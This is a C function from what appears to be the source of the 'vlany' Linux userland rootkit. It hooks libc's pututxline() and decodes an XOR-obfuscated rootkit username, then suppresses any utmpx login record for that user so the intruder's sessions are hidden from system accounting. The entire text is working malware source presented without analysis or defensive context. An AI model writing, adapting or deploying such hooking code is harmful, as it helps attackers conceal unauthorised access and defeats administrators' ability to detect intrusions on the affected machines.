struct utmpx *pututxline(const struct utmpx *utx)
{
    #ifdef DEBUG
        printf("[vlany] pututxline() called\n");
    #endif

    HOOK(old_pututxline, CPUTUTXLINE);

    struct utmpx *tmp;
    tmp = old_pututxline(utx);

    if(tmp && tmp->ut_user != NULL)
    {
        char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
        if(!strcmp(tmp->ut_user, vlany_user)){ CLEAN(vlany_user); return NULL; }
        CLEAN(vlany_user);
    }

    return tmp;
}
